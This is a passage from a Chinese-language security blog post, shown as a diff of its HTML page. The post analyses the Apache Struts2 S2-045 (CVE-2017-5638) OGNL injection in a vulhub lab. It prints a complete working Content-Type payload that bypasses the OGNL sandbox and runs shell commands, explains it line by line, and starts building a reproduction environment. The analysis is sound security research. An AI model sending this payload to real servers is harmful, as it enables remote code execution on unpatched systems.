@@ -1,0 +1,1342 @@
+<!--
+  ╔══════════════════════════════════════════════════════════════╗
+  ║                                                              ║
+  ║   🎮 CTF Easter Egg Challenge!                               ║
+  ║                                                              ║
+  ║   Congratulations! You found the hidden comment!             ║
+  ║                                                              ║
+  ║   Here's your clue: The flag is the site owner's name        ║
+  ║   in lowercase letters.                                      ║
+  ║                                                              ║
+  ║   Open browser console and type:                             ║
+  ║   secret.flag("your_answer")                                 ║
+  ║                                                              ║
+  ║   Or try: secret.hint() for more clues                       ║
+  ║                                                              ║
+  ╚══════════════════════════════════════════════════════════════╝
+-->
+
+<!DOCTYPE html><html lang="zh-CN" data-theme="dark">
+
+<head>
+  <meta charset="utf-8">
+  <style id="waifu-preload">#waifu{opacity:0;background:transparent;}#waifu canvas,#waifu #live2d,#waifu-toolbar{background:transparent;}</style>
+  <meta name="hexo-theme" content="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.33.1" theme-name="Stellar" theme-version="1.33.1">
+  <link rel="manifest" href="/manifest.json">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+  <meta name="apple-mobile-web-app-title" content="Blog">
+  
+  
+  <meta name="generator" content="Hexo 7.3.0">
+  <meta http-equiv='x-dns-prefetch-control' content='on' />
+  
+  <meta name="renderer" content="webkit">
+  <meta name="force-rendering" content="webkit">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+  <meta name="HandheldFriendly" content="True" >
+  <meta name="mobile-web-app-capable" content="yes">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#000">
+  <meta name="theme-color" content="#f9fafb">
+  <title>代码审计 | Struts2 —— S2-045 OGNL 注入与三重沙箱绕过分析 - blog</title>
+
+  
+    <meta name="description" content="代码审计 | Struts2 —— S2-045 OGNL 注入与三重沙箱绕过分析 CVE-2017-5638 · Apache Struts2 · Jakarta 多部分解析器 RCE   目录 环境搭建 漏洞触发验证 Payload 逐段拆解 手动搭建复现环境 正常请求流程梳理 调试验证 OGNL 执行 源码调用栈分析 沙箱机制与绕过过程 总结   环境搭建用 vulhub 直接起环境，省事：">
+<meta property="og:type" content="article">
+<meta property="og:title" content="代码审计 | Struts2 —— S2-045 OGNL 注入与三重沙箱绕过分析">
+<meta property="og:url" content="https://wr0ld.github.io/posts/c3d8e7f2/">
+<meta property="og:site_name" content="blog">
+<meta property="og:description" content="代码审计 | Struts2 —— S2-045 OGNL 注入与三重沙箱绕过分析 CVE-2017-5638 · Apache Struts2 · Jakarta 多部分解析器 RCE   目录 环境搭建 漏洞触发验证 Payload 逐段拆解 手动搭建复现环境 正常请求流程梳理 调试验证 OGNL 执行 源码调用栈分析 沙箱机制与绕过过程 总结   环境搭建用 vulhub 直接起环境，省事：">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://wr0ld.github.io/avatar.png">
+<meta property="article:published_time" content="2026-05-12T08:30:00.000Z">
+<meta property="article:modified_time" content="2026-05-12T09:40:25.822Z">
+<meta property="article:author" content="wr0ld">
+<meta property="article:tag" content="代码审计">
+<meta property="article:tag" content="Java">
+<meta property="article:tag" content="RCE">
+<meta property="article:tag" content="Struts2">
+<meta property="article:tag" content="OGNL">
+<meta property="article:tag" content="S2-045">
+<meta property="article:tag" content="CVE-2017-5638">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://wr0ld.github.io/avatar.png">
+  
+  
+  
+  <meta name="keywords" content="代码审计,Java,RCE,Struts2,OGNL,S2-045,CVE-2017-5638">
+
+  <!-- feed -->
+  
+
+  <link rel="stylesheet" href="/css/main.css?v=mp2fxa0b">
+
+
+  
+    <link rel="shortcut icon" href="/avatar.png">
+  
+
+  
+
+  <script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"wr0ld","sameAs":[],"image":"/avatar.png"},"dateCreated":"2026-05-12T16:30:00+08:00","dateModified":"2026-05-12T17:40:25+08:00","datePublished":"2026-05-12T16:30:00+08:00","description":"","headline":"代码审计 | Struts2 —— S2-045 OGNL 注入与三重沙箱绕过分析","mainEntityOfPage":{"@type":"WebPage","@id":"https://wr0ld.github.io/posts/c3d8e7f2/"},"publisher":{"@type":"Organization","name":"wr0ld","sameAs":[],"image":"/avatar.png","logo":{"@type":"ImageObject","url":"/avatar.png"}},"url":"https://wr0ld.github.io/posts/c3d8e7f2/","keywords":"代码审计, Java, RCE, Struts2, OGNL, S2-045, CVE-2017-5638","thumbnailUrl":"https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/o4gsLkYFH1AABIRX4wPAayAcPiICmiAEDgXj3~tplv-dy-aweme-images-ds-rs-v1_1920_1080_q80.jpg","image":1}</script>
+  
+</head>
+<body><div class="reading-progress-bar"></div>
+
+<div class="l_body content" id="start" layout="post" type="tech" ><aside class="l_left"><div class="sidebg"></div><div class="leftbar-container">
+
+
+<header class="header"><div class="logo-wrap"><a class="avatar" href="/about/"><div class="bg" style="opacity:0;background-image:url(https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/avatar/round/rainbow64@3x.webp);"></div><img no-lazy class="avatar" src="/avatar.png" onerror="javascript:this.classList.add('error');this.src='https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/image/2659360.svg';"></a><a class="title" href="/"><div class="main">blog</div></a></div></header>
+
+<div class="nav-area">
+
+<nav class="menu dis-select"><a class="nav-item active" title="博客" href="/" style="color:#1BCDFC"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M5.879 2.879C5 3.757 5 5.172 5 8v8c0 2.828 0 4.243.879 5.121C6.757 22 8.172 22 11 22h2c2.828 0 4.243 0 5.121-.879C19 20.243 19 18.828 19 16V8c0-2.828 0-4.243-.879-5.121C17.243 2 15.828 2 13 2h-2c-2.828 0-4.243 0-5.121.879M8.25 17a.75.75 0 0 1 .75-.75h3a.75.75 0 0 1 0 1.5H9a.75.75 0 0 1-.75-.75M9 12.25a.75.75 0 0 0 0 1.5h6a.75.75 0 0 0 0-1.5zM8.25 9A.75.75 0 0 1 9 8.25h6a.75.75 0 0 1 0 1.5H9A.75.75 0 0 1 8.25 9" clip-rule="evenodd"/><path fill="currentColor" d="M5.235 4.058C5 4.941 5 6.177 5 8v8c0 1.823 0 3.058.235 3.942L5 19.924c-.975-.096-1.631-.313-2.121-.803C2 18.243 2 16.828 2 14v-4c0-2.829 0-4.243.879-5.121c.49-.49 1.146-.707 2.121-.803zm13.53 15.884C19 19.058 19 17.822 19 16V8c0-1.823 0-3.059-.235-3.942l.235.018c.975.096 1.631.313 2.121.803C22 5.757 22 7.17 22 9.999v4c0 2.83 0 4.243-.879 5.122c-.49.49-1.146.707-2.121.803z" opacity=".5"/></svg></a><a class="nav-item" title="关于" href="/about/" style="color:#3DC550"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4s-4 1.79-4 4s1.79 4 4 4" opacity=".5"/><path fill="currentColor" fill-rule="evenodd" d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10s10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5l1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z" clip-rule="evenodd"/></svg></a><a class="nav-item" title="设置" href="/settings/" style="color:#9B59B6"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M12 2c-1.5 0-2.5 1.5-2.5 3v.5c0 .5-.5 1-1 1H7c-1.5 0-2.5 1-3 2.5l-.5 2c-.5 1.5.5 3 2 3.5l.5.2c.5.2 1 .7 1 1.3v.5c0 .5-.5 1-1 1.3l-.5.2c-1.5.5-2.5 2-2 3.5l.5 2c.5 1.5 1.5 2.5 3 2.5h1.5c.5 0 1-.5 1-1V20c0-.5.5-1 1-1h2c.5 0 1 .5 1 1v.5c0 .5.5 1 1 1H17c1.5 0 2.5-1 3-2.5l.5-2c.5-1.5-.5-3-2-3.5l-.5-.2c-.5-.2-1-.7-1-1.3v-.5c0-.5.5-1 1-1.3l.5-.2c1.5-.5 2.5-2 2-3.5l-.5-2c-.5-1.5-1.5-2.5-3-2.5h-1.5c-.5 0-1 .5-1 1V6c0 .5-.5 1-1 1h-2c-.5 0-1-.5-1-1v-.5c0-.5-.5-1-1-1" opacity=".5"/><path fill="currentColor" d="M12 15a3 3 0 1 0 0-6a3 3 0 0 0 0 6" clip-rule="evenodd"/></svg></a><div class="menu-divider"></div><a class="nav-item" title="实验室" href="/lab/" style="color:#F39C12"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M3.464 3.464C2 4.93 2 7.286 2 12s0 7.071 1.464 8.535C4.93 22 7.286 22 12 22s7.071 0 8.535-1.465C22 19.072 22 16.714 22 12s0-7.071-1.465-8.536C19.072 2 16.714 2 12 2S4.929 2 3.464 3.464" opacity=".5"/><path fill="currentColor" fill-rule="evenodd" d="M7.47 8.47a.75.75 0 0 1 1.06 0l2 2a.75.75 0 0 1 0 1.06l-2 2a.75.75 0 1 1-1.06-1.06L8.94 11L7.47 9.53a.75.75 0 0 1 0-1.06M12 14.25a.75.75 0 0 0 0 1.5h4a.75.75 0 0 0 0-1.5z" clip-rule="evenodd"/></svg></a><a class="nav-item" title="相册" href="/gallery/" style="color:#FF9FF3"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M2 12c0-4.714 0-7.071 1.464-8.536C4.93 2 7.286 2 12 2s7.071 0 8.535 1.464C22 4.93 22 7.286 22 12s0 7.071-1.465 8.535C19.072 22 16.714 22 12 22s-7.071 0-8.536-1.465C2 19.072 2 16.714 2 12" opacity=".5"/><path fill="currentColor" d="M8.5 9.5a1 1 0 1 0 0-2 1 1 0 0 0 0 2"/><path fill="currentColor" fill-rule="evenodd" d="M12 12c0-.943 0-1.414.293-1.707S13.057 10 14 10h2c.943 0 1.414 0 1.707.293S18 11.057 18 12v2c0 .943 0 1.414-.293 1.707S16.943 16 16 16h-2c-.943 0-1.414 0-1.707-.293S12 14.943 12 14zM2 12c0 4.714 0 7.071 1.464 8.535C4.93 22 7.286 22 12 22s7.071 0 8.535-1.465C22 19.072 22 16.714 22 12s0-7.071-1.465-8.536C19.072 2 16.714 2 12 2S4.929 2 3.464 3.464C2 4.93 2 7.286 2 12m1 6l3.296-3.296a1.117 1.117 0 0 1 1.58 0l.374.373a1.117 1.117 0 0 0 1.58 0l3.17-3.17a1.117 1.117 0 0 1 1.58 0L18 14" clip-rule="evenodd"/></svg></a><a class="nav-item" title="游戏" href="/games/" style="color:#FF6B6B"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M2 9.5c0-2.496 0-3.744.494-4.696a4.5 4.5 0 0 1 1.81-1.81C5.256 2.5 6.504 2.5 9 2.5h6c2.496 0 3.744 0 4.696.494a4.5 4.5 0 0 1 1.81 1.81C22 5.756 22 7.004 22 9.5v5c0 2.496 0 3.744-.494 4.696a4.5 4.5 0 0 1-1.81 1.81C18.744 21.5 17.496 21.5 15 21.5H9c-2.496 0-3.744 0-4.696-.494a4.5 4.5 0 0 1-1.81-1.81C2 18.244 2 16.996 2 14.5z" opacity=".5"/><path fill="currentColor" fill-rule="evenodd" d="M6.25 12a.75.75 0 0 1 .75-.75h2.25V9a.75.75 0 0 1 1.5 0v2.25H13a.75.75 0 0 1 0 1.5h-2.25V15a.75.75 0 0 1-1.5 0v-2.25H7a.75.75 0 0 1-.75-.75m9.5-1a1 1 0 1 0 0 2a1 1 0 0 0 0-2m2 3a1 1 0 1 0 2 0a1 1 0 0 0-2 0" clip-rule="evenodd"/></svg></a><a class="nav-item" title="卡牌" href="javascript:if(window.CardSystem)window.CardSystem.showPanel()" style="color:#E91E63"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M3.464 3.464C2 4.93 2 7.286 2 12s0 7.071 1.464 8.535C4.93 22 7.286 22 12 22s7.071 0 8.535-1.465C22 19.072 22 16.714 22 12s0-7.071-1.465-8.536C19.072 2 16.714 2 12 2S4.929 2 3.464 3.464" opacity=".5"/><path fill="currentColor" fill-rule="evenodd" d="M7.5 6.75a.75.75 0 0 0-.75.75v1.5c0 .414.336.75.75.75h9a.75.75 0 0 0 .75-.75v-1.5a.75.75 0 0 0-.75-.75zm-.75 5.25a.75.75 0 0 1 .75-.75h4.5a.75.75 0 0 1 0 1.5H7.5a.75.75 0 0 1-.75-.75m.75 2.25a.75.75 0 0 0 0 1.5h3a.75.75 0 0 0 0-1.5z" clip-rule="evenodd"/></svg></a></nav>
+</div>
+<div class="widgets">
+<div class="search-wrapper" id="search-wrapper"><form class="search-form"><a class="search-button" onclick="document.getElementById(&quot;search-input&quot;).focus();"><svg t="1705074644177" viewBox="0 0 1025 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="1560" width="200" height="200"><path d="M1008.839137 935.96571L792.364903 719.491476a56.783488 56.783488 0 0 0-80.152866 0 358.53545 358.53545 0 1 1 100.857314-335.166073 362.840335 362.840335 0 0 1-3.689902 170.145468 51.248635 51.248635 0 1 0 99.217358 26.444296 462.057693 462.057693 0 1 0-158.255785 242.303546l185.930047 185.725053a51.248635 51.248635 0 0 0 72.568068 0 51.248635 51.248635 0 0 0 0-72.978056z" p-id="1561"></path><path d="M616.479587 615.969233a50.428657 50.428657 0 0 0-61.498362-5.534852 174.655348 174.655348 0 0 1-177.525271 3.484907 49.403684 49.403684 0 0 0-58.833433 6.76482l-3.074918 2.869923a49.403684 49.403684 0 0 0 8.609771 78.10292 277.767601 277.767601 0 0 0 286.992355-5.739847 49.403684 49.403684 0 0 0 8.404776-76.667958z" p-id="1562"></path></svg></a><input type="text" class="search-input" id="search-input" placeholder="站内搜索"></form><div id="search-result"></div><div class="search-no-result">没有找到内容！</div></div>
+
+<widget class="widget-wrapper slide-up todo-widget collapsible-widget"><div class="widget-header dis-select"><span class="name">任务简报 <span class="todo-count">(12)</span></span></div><div class="widget-body fs14"><div class="todo-list"><div class="todo-item doing"><span class="todo-content">内存马 → 检测查杀</span></div><div class="todo-item doing"><span class="todo-content">log4j 内存马+jndi urldns grov</span></div><div class="todo-item doing"><span class="todo-content">EDUSRC实战漏洞挖掘复盘脱敏</span></div><div class="todo-item doing"><span class="todo-content">小迪vpc1-5 Windows系统web内网横向域内</span></div><div class="todo-item doing"><span class="todo-content">rootkit 的 shellcode 嵌入</span></div><div class="todo-item doing"><span class="todo-content">fastjson 1.2.68 → 1.2.80</span></div><div class="todo-item doing"><span class="todo-content">java cc4 5 7</span></div><div class="todo-item doing"><span class="todo-content">Shiro 721</span></div><div class="todo-item doing"><span class="todo-content">信息收集</span></div><div class="todo-item doing"><span class="todo-content">PHP反序列化 + Pop Chain构造</span></div><div class="todo-item doing"><span class="todo-content">云上服务</span></div><div class="todo-item doing"><span class="todo-content">docker容器逃逸</span></div></div></div></widget>
+</div>
+
+</div></aside><div class="l_main" id="main">
+
+
+
+
+
+<div class="article banner slide-up top">
+  <div class="content">
+    <div class="top bread-nav footnote"><div class="left"><div class="flex-row" id="breadcrumb"><a class="cap breadcrumb" href="/">主页</a>
+<span class="sep"></span><a class="cap breadcrumb" href="/">文章</a><span class="sep"></span><a class="cap breadcrumb-link" href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a> <span class="sep"></span> <a class="cap breadcrumb-link" href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/struts2/">struts2</a></div>
+<div class="flex-row" id="post-meta"><span class="text created">发布于：<time datetime="2026-05-12T08:30:00.000Z">2026-05-12</time></span><span class="sep"></span><span class="text word-count">字数：16925</span><span class="sep"></span><span class="text img-count">图片：64</span></div></div></div>
+    
+    <div class="bottom only-title">
+      
+      <div class="text-area">
+        <h1 class="text title"><span>代码审计 | Struts2 —— S2-045 OGNL 注入与三重沙箱绕过分析</span></h1>
+        
+      </div>
+    </div>
+    
+  </div>
+  </div><article class="md-text content slide-up"><h1 id="代码审计-Struts2-——-S2-045-OGNL-注入与三重沙箱绕过分析"><a href="#代码审计-Struts2-——-S2-045-OGNL-注入与三重沙箱绕过分析" class="headerlink" title="代码审计 | Struts2 —— S2-045 OGNL 注入与三重沙箱绕过分析"></a>代码审计 | Struts2 —— S2-045 OGNL 注入与三重沙箱绕过分析</h1><blockquote>
+<p>CVE-2017-5638 · Apache Struts2 · Jakarta 多部分解析器 RCE</p>
+</blockquote>
+<hr>
+<h2 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h2><ul>
+<li><a href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA">环境搭建</a></li>
+<li><a href="#%E6%BC%8F%E6%B4%9E%E8%A7%A6%E5%8F%91%E9%AA%8C%E8%AF%81">漏洞触发验证</a></li>
+<li><a href="#payload-%E9%80%90%E6%AE%B5%E6%8B%86%E8%A7%A3">Payload 逐段拆解</a></li>
+<li><a href="#%E6%89%8B%E5%8A%A8%E6%90%AD%E5%BB%BA%E5%A4%8D%E7%8E%B0%E7%8E%AF%E5%A2%83">手动搭建复现环境</a></li>
+<li><a href="#%E6%AD%A3%E5%B8%B8%E8%AF%B7%E6%B1%82%E6%B5%81%E7%A8%8B%E6%A2%B3%E7%90%86">正常请求流程梳理</a></li>
+<li><a href="#%E8%B0%83%E8%AF%95%E9%AA%8C%E8%AF%81-ognl-%E6%89%A7%E8%A1%8C">调试验证 OGNL 执行</a></li>
+<li><a href="#%E6%BA%90%E7%A0%81%E8%B0%83%E7%94%A8%E6%A0%88%E5%88%86%E6%9E%90">源码调用栈分析</a></li>
+<li><a href="#%E6%B2%99%E7%AE%B1%E6%9C%BA%E5%88%B6%E4%B8%8E%E7%BB%95%E8%BF%87%E8%BF%87%E7%A8%8B">沙箱机制与绕过过程</a></li>
+<li><a href="#%E6%80%BB%E7%BB%93">总结</a></li>
+</ul>
+<hr>
+<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>用 vulhub 直接起环境，省事：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/vulhub/vulhub.git</span><br><span class="line"><span class="built_in">cd</span> vulhub/struts2/s2-045</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
+
+<p>起来之后访问 <code>http://127.0.0.1:8080</code>：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260512_164827_gaj5.png"></p>
+<p>这里用 yakit 抓个包：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260512_164827_1uuw.png"></p>
+<p>这是正常的响应包：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryzlnKBM4ABUiDAvZG</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260512_164827_giax.png"></p>
+<hr>
+<h2 id="漏洞触发验证"><a href="#漏洞触发验证" class="headerlink" title="漏洞触发验证"></a>漏洞触发验证</h2><p>先把 <code>Content-Type</code> 那一行整个换成下面这个，做个 OGNL 数学计算验证，确认表达式是否被执行：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Type: %&#123;(#test=&#x27;multipart/form-data&#x27;).(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=&#x27;id&#x27;).(#iswin=(@java.lang.System@getProperty(&#x27;os.name&#x27;).toLowerCase().contains(&#x27;win&#x27;))).(#cmds=(#iswin?&#123;&#x27;cmd.exe&#x27;,&#x27;/c&#x27;,#cmd&#125;:&#123;&#x27;/bin/sh&#x27;,&#x27;-c&#x27;,#cmd&#125;)).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())&#125;</span><br></pre></td></tr></table></figure>
+
+<p>发包，命令成功执行并回显：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260512_164827_fk2k.png"></p>
+<hr>
+<h2 id="Payload-逐段拆解"><a href="#Payload-逐段拆解" class="headerlink" title="Payload 逐段拆解"></a>Payload 逐段拆解</h2><p>先把这个 payload 拆开看，整体是一个 OGNL 表达式链，塞在 <code>Content-Type</code> 头里。</p>
+<h3 id="是什么"><a href="#是什么" class="headerlink" title="%{...} 是什么"></a><code>%&#123;...&#125;</code> 是什么</h3><p><code>%&#123;...&#125;</code> 是 Struts2 的 OGNL 表达式标记，整个链用 <code>.</code> 串联，分几段。</p>
+<p>OGNL 里用 <code>(expr1).(expr2)</code> 这种形式来串联多个表达式，每个括号是一个独立的子表达式，点号把它们连起来顺序执行。点号串联的返回值是最后一个表达式的结果，前面的表达式主要是为了副作用（比如赋值、修改状态）。</p>
+<p>举个简单例子：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(#a=<span class="number">1</span>).(#b=<span class="number">2</span>).(#a+#b)  <span class="comment">// 返回 3，但前两步赋值的副作用都生效了</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="完整-payload-注释版"><a href="#完整-payload-注释版" class="headerlink" title="完整 payload 注释版"></a>完整 payload 注释版</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">%&#123;</span><br><span class="line">  (#test=&#x27;multipart/form-data&#x27;).                         // 伪造正常的 multipart 请求，骗过 Content-Type 检测</span><br><span class="line"></span><br><span class="line">  (#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).         // 获取 OGNL 最高权限的 MemberAccess 对象</span><br><span class="line"></span><br><span class="line">  (#_memberAccess?                                       // 三元判断：_memberAccess 存在（低版本）？</span><br><span class="line">    (#_memberAccess=#dm)                                 //   是 → 直接替换为最高权限，完成沙箱逃逸</span><br><span class="line">    :((#container=#context[&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;]).  //   否 → 从 context 拿 IoC 容器</span><br><span class="line">      (#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)). // 从容器获取 OgnlUtil 实例</span><br><span class="line">      (#ognlUtil.getExcludedPackageNames().clear()).     //   清空包名黑名单</span><br><span class="line">      (#ognlUtil.getExcludedClasses().clear()).          //   清空类黑名单</span><br><span class="line">      (#context.setMemberAccess(#dm)))).                 //   设置最高权限，完成沙箱逃逸</span><br><span class="line"></span><br><span class="line">  (#cmd=&#x27;id&#x27;).                                           // 要执行的命令</span><br><span class="line"></span><br><span class="line">  (#iswin=(@java.lang.System@getProperty(&#x27;os.name&#x27;).toLowerCase().contains(&#x27;win&#x27;))). // 判断是否 Windows 系统</span><br><span class="line"></span><br><span class="line">  (#cmds=(#iswin?&#123;&#x27;cmd.exe&#x27;,&#x27;/c&#x27;,#cmd&#125;:&#123;&#x27;/bin/sh&#x27;,&#x27;-c&#x27;,#cmd&#125;)). // 根据系统构造命令数组</span><br><span class="line"></span><br><span class="line">  (#p=new java.lang.ProcessBuilder(#cmds)).              // 创建 ProcessBuilder 准备起子进程</span><br><span class="line"></span><br><span class="line">  (#p.redirectErrorStream(true)).                        // stderr 合并到 stdout，避免漏输出</span><br><span class="line"></span><br><span class="line">  (#process=#p.start()).                                 // 启动子进程执行命令</span><br><span class="line"></span><br><span class="line">  (#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())). // 拿到 HTTP Response 的输出流</span><br><span class="line"></span><br><span class="line">  (@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)). // 把命令执行结果 copy 到响应流</span><br><span class="line"></span><br><span class="line">  (#ros.flush())                                         // 刷新输出流，回显到 HTTP 响应</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p><strong>补充：为什么要先判断 <code>#_memberAccess</code>？</strong></p>
+<p>Struts2 不同版本对 OGNL 上下文的暴露方式不一样。低版本中 <code>_memberAccess</code> 可以直接从上下文访问并赋值，而高版本加了额外保护，所以 payload 里做了三元判断来兼容两种情况。这也是公开 payload 里那段看起来很绕的结构的原因。</p>
+</blockquote>
+<hr>
+<h2 id="手动搭建复现环境"><a href="#手动搭建复现环境" class="headerlink" title="手动搭建复现环境"></a>手动搭建复现环境</h2><p>为了更好地理解漏洞触发链，自己搭一个最小化的复现环境来单步调试。</p>
+<h3 id="pom-xml"><a href="#pom-xml" class="headerlink" title="pom.xml"></a>pom.xml</h3><p>核心依赖就两个，struts2-core 和 Jakarta 的 multipart 解析器：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.struts<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>struts2-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.3.28<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- Jakarta multipart 解析器依赖 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-fileupload<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-fileupload<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.3.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="web-xml-—-Struts2-的入口"><a href="#web-xml-—-Struts2-的入口" class="headerlink" title="web.xml — Struts2 的入口"></a>web.xml — Struts2 的入口</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>struts2<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-class</span>&gt;</span>org.apache.struts2.dispatcher.ng.filter.StrutsPrepareAndExecuteFilter<span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>struts2<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
